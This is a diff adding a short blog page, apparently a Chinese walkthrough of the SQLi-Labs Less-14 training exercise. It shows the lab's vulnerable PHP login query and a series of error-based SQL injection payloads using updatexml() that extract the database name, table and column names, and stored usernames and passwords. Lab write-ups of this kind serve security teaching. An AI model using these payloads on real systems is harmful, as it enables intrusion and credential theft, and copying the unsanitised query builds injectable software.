@@ -1,0 +1,19 @@
+<hr>
+<h2 id="title-less14url-https-www-yuque-com-u29002979-ep2zrx-mi0osadlf96k83pm"><a href="#title-less14url-https-www-yuque-com-u29002979-ep2zrx-mi0osadlf96k83pm" class="headerlink" title="title: less14url: https://www.yuque.com/u29002979/ep2zrx/mi0osadlf96k83pm"></a>title: less14<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/mi0osadlf96k83pm">https://www.yuque.com/u29002979/ep2zrx/mi0osadlf96k83pm</a></h2><pre><code class="bash">$uname=&#39;&quot;&#39;.$uname.&#39;&quot;&#39;;
+$passwd=&#39;&quot;&#39;.$passwd.&#39;&quot;&#39;; 
+@$sql=&quot;SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1&quot;;
+</code></pre>
+<p>与Less12的区别闭合方式为**” **&amp;#x20;<br><code>1&quot;</code></p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1”” and password&#x3D;”” LIMIT 0,1’ at line 1</p>
+</blockquote>
+<p>继续使用updataxml()函数</p>
+<pre><code class="bash">查询数据库表
+-1&quot; or updatexml(1,concat(0x7e,(select database()),0x7e),1) -- +
+爆破数据表
+-1&quot; or updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database() limit 2,1),0x7e),1) -- +
+爆破字段名
+-1&quot; or updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&#39;users&#39; limit 8,1),0x7e),1) -- +
+爆破字段
+-1&quot; or updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users limit 0,1),0x7e),1) -- +
+</code></pre>
